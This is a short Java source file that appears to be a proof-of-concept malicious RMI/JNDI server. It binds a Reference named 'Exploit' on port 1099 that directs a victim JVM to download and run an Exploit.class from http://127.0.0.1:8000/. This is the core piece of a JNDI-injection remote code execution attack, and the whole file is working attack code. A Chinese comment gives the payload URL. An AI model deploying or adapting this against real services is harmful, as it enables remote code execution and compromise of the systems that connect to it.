import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class JNDIServer {
    public static void main(String[] args) throws AlreadyBoundException, NamingException, RemoteException {
        Registry registry = LocateRegistry.createRegistry(1099);
        //http://127.0.0.1:8000/Exploit.class即可
        Reference reference = new Reference("Exloit",
                "Exploit","http://127.0.0.1:8000/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("Exploit",referenceWrapper);
    }
}